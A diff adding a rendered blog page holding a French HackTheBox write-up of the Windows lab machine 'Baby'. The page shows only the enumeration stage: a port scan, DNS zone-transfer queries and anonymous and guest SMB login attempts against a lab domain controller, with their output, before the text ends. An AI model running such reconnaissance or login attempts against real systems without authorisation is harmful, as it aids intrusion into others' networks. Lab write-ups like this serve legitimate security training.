@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Baby - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/baby/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Baby">
+  <meta property="og:description" content="Baby est une machine Windows facile à utiliser, dotée de l’énumération LDAP, de la dispersion de mots de passe et de l’exposition des identifiants. Pour l’élévation des privilèges, la faille SeBackupPrivilege est exploitée pour extraire le registre SYSTEM et le fichier NTDS.dit. Une attaque Pass-the-Hash peut être réalisée en utilisant les hachages de domaine non couverts, obtenant ainsi un accès Administrateur.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="SeBackupPrivilege">
+    <meta property="article:tag" content="ADCS">
+    <meta property="article:tag" content="Shadow Copy">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Baby">
+  <meta name="twitter:description" content="Baby est une machine Windows facile à utiliser, dotée de l’énumération LDAP, de la dispersion de mots de passe et de l’exposition des identifiants. Pour l’élévation des privilèges, la faille SeBackupPrivilege est exploitée pour extraire le registre SYSTEM et le fichier NTDS.dit. Une attaque Pass-the-Hash peut être réalisée en utilisant les hachages de domaine non couverts, obtenant ainsi un accès Administrateur.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/baby/" /><link rel="prev" href="http://localhost:1313/build/" /><link rel="next" href="http://localhost:1313/certified/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Baby",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/baby\/"
+        },"genre": "posts","keywords": "Easy, Windows, Active Directory, SeBackupPrivilege, ADCS, Shadow Copy","wordcount":  1539 ,
+        "url": "http:\/\/localhost:1313\/baby\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Baby</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1539 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#dns---tcp-53">DNS - TCP 53</a></li>
+            <li><a href="#smb---tcp-445">SMB - TCP 445</a></li>
+            <li><a href="#ldap---tcp-389">LDAP - TCP 389</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-carolinerobinson">Shell as Caroline.Robinson</a>
+          <ul>
+            <li><a href="#password-spray">Password spray</a></li>
+            <li><a href="#user-enumeration">User enumeration</a></li>
+            <li><a href="#change-carolines-password">Change Caroline&rsquo;s password</a></li>
+            <li><a href="#evil-winrm">evil-winrm</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-root">Shell as root</a>
+          <ul>
+            <li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
+            <li><a href="#shadow-copy">Shadow Copy</a></li>
+            <li><a href="#evil-winrm-1">evil-winrm</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/baby.png"
+        data-srcset="/images/Baby/baby.png, /images/Baby/baby.png 1.5x, /images/Baby/baby.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/baby.png"
+        title="baby" width="615" height="305" /></p>
+<p>Baby est une machine Windows facile à utiliser, dotée de l&rsquo;énumération LDAP, de la dispersion de mots de passe et de l&rsquo;exposition des identifiants. Pour l&rsquo;élévation des privilèges, la faille <code>SeBackupPrivilege</code> est exploitée pour extraire le registre SYSTEM et le fichier <code>NTDS.dit</code>. Une attaque <code>Pass-the-Hash</code> peut être réalisée en utilisant les hachages de domaine non couverts, obtenant ainsi un accès Administrateur.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Le scan révèle 19 ports ouverts.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  rustscan -a 10.129.195.51 -- -A
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        syn-ack ttl <span class="m">127</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  syn-ack ttl <span class="m">127</span> Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-10-02 15:55:59Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">127</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server syn-ack ttl <span class="m">127</span> Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>BabyDC.baby.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>BabyDC.baby.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-18T12:14:43
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2026-02-17T12:14:43
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   0321bf6e5491db70a4149f0b3b104b00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: f1dd7df6498495af6ca2e50e0fdae11aa84dcda5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIC4DCCAcigAwIBAgIQcx5FdJf0qLtO4yv+5PuH2zANBgkqhkiG9w0BAQsFADAZ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNTA4MTgxMjE0NDNaFw0yNjAy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTcxMjE0NDNaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwc2kSFwv2JvtdgsXNK/Tiwh2yqNd22KrACou
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hzgqCij41ZS1gTcD+tFFFo2rgQ22rg8zBz8AhvSFIdqT19HfLe+ghXZT4/e13BTT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ibrD814rd55wcLuoa9hxZjpU3pPN9W9SkHaF77G5a6AzB1+HjTWVtMJxClJAnpRm
+</span></span><span class="line"><span class="cl"><span class="p">|</span> iWnPOwvhsdNJUeNl2Npx8MtftbuHNvCZ2h5Wxzcyxjw7ZeAI6ysi5sSRtEeDvcqR
+</span></span><span class="line"><span class="cl"><span class="p">|</span> uHt3UjatHirs76lir5zlxm52aUdrhRCPD77RoGU5D1CcsCraKPEVUAvLbkio2JPT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> aaYJ8E+zI8wpgDijCuEYyt/piEIq/F9aappfnOSyhDlsgzZHfQIDAQABoyQwIjAT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ggEBALYrswTrxcf3pCupW/vFNUgEi2Xrh6fjtFsuerzuuCb3ODmeQqj4Pg1qBoeC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> X+j3v33A4Ze0s2dbk512tBxi3+dNI/cl4EQyETMu4b7fqsYkeogKsg0luEJXSt+y
+</span></span><span class="line"><span class="cl"><span class="p">|</span> scC0LOFJpVoFmo4CYVISqsRQlI1qVEVtup1LSoNZNwX3lEBc6HenqG+Xigz6G/Rl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> jzWfNDsvU5qzd1B3FJALwq/peYS6H7DFwMgpiBtQCdcGAwj8Po/vfSQHMwWY4cd0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> D3ayH/t6JCPt1DCusE1YjM3Hu6X7AjJiIW5QjVN83+90jV2D+jeYrUv5W8UmVM1r
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">FkmiutEESB5awZaenoWT83gDZ1Q</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-10-02T15:57:34+00:00<span class="p">;</span> 0s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: BABY
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: BABY
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: BABYDC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: baby.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: BabyDC.baby.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: baby.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2025-10-02T15:56:55+00:00
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        syn-ack ttl <span class="m">127</span> .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51554/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">57975/tcp open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">57976/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">57985/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows <span class="m">2016</span> <span class="o">(</span>85%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:microsoft:windows_server_2016
+</span></span><span class="line"><span class="cl">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Microsoft Windows Server <span class="m">2016</span> <span class="o">(</span>85%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.93%E<span class="o">=</span>4%D<span class="o">=</span>10/2%OT<span class="o">=</span>53%CT<span class="o">=</span>%CU<span class="o">=</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>N%TM<span class="o">=</span>68DEA0F1%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>103%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>A<span class="o">)</span>
+</span></span><span class="line"><span class="cl">OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M542NW8ST11%O2<span class="o">=</span>M542NW8ST11%O3<span class="o">=</span>M542NW8NNT11%O4<span class="o">=</span>M542NW8ST11%O5<span class="o">=</span>M542NW8ST11%O6<span class="o">=</span>M542ST11<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FFFF%W2<span class="o">=</span>FFFF%W3<span class="o">=</span>FFFF%W4<span class="o">=</span>FFFF%W5<span class="o">=</span>FFFF%W6<span class="o">=</span>FFDC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%TG<span class="o">=</span>80%W<span class="o">=</span>FFFF%O<span class="o">=</span>M542NW8NNS%CC<span class="o">=</span>Y%Q<span class="o">=)</span>
+</span></span><span class="line"><span class="cl">T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%TG<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+</span></span><span class="line"><span class="cl">T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+</span></span><span class="line"><span class="cl">T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+</span></span><span class="line"><span class="cl">T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+</span></span><span class="line"><span class="cl">U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+</span></span><span class="line"><span class="cl">IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%TG<span class="o">=</span>80%CD<span class="o">=</span>Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Uptime guess: 0.003 days <span class="o">(</span>since Thu Oct  <span class="m">2</span> 17:53:13 2025<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">259</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">IP ID Sequence Generation: Incremental
+</span></span><span class="line"><span class="cl">Service Info: Host: BABYDC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-10-02T15:56:56
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 0s, deviation: 0s, median: 0s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 33386/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 60729/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 41102/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 49221/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked</span></span></code></pre></div></div>
+<p>Le scan révèle aussi le nom de domaine <code>baby.vl</code> ainsi que le hostname <code>BABYDC</code>. Je l&rsquo;ai ajoute tous les deux dans le fichier <code>/etc/hosts</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-1.png"
+        data-srcset="/images/Baby/Baby-1.png, /images/Baby/Baby-1.png 1.5x, /images/Baby/Baby-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-1.png"
+        title="/images/Baby/Baby-1.png" width="591" height="150" /></p>
+<h3 id="dns---tcp-53">DNS - TCP 53</h3>
+<p>Je fais du Zone transfert mais je ne trouve rien.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  dig axfr baby.vl @10.129.195.51 +noall +answer
+</span></span><span class="line"><span class="cl"><span class="p">;</span> Transfer failed.</span></span></code></pre></div></div>
+<p>Ensuite je récupère tous les enregistrements DNS disponibles. Mais là aussi rien d’intéressant.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  dig any baby.vl @10.129.195.51 +noall +answer
+</span></span><span class="line"><span class="cl">baby.vl.                <span class="m">600</span>     IN      A       10.10.76.161
+</span></span><span class="line"><span class="cl">baby.vl.                <span class="m">3600</span>    IN      NS      babydc.baby.vl.
+</span></span><span class="line"><span class="cl">baby.vl.                <span class="m">3600</span>    IN      SOA     babydc.baby.vl. hostmaster.baby.vl. <span class="m">67</span> <span class="m">900</span> <span class="m">600</span> <span class="m">86400</span> <span class="m">3600</span></span></span></code></pre></div></div>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>Je m&rsquo;attaque ensuite au SMB. Je vois que l&rsquo;authentification anonyme échoue et que le compte <code>Guest</code> est désactivé.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb babydc.baby.vl -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:BABYDC<span class="o">)</span> <span class="o">(</span>domain:baby.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>+<span class="o">]</span> baby.vl<span class="se">\:</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb babydc.baby.vl -u guest -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:BABYDC<span class="o">)</span> <span class="o">(</span>domain:baby.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>-<span class="o">]</span> baby.vl<span class="se">\g</span>uest: STATUS_ACCOUNT_DISABLED</span></span></code></pre></div></div>
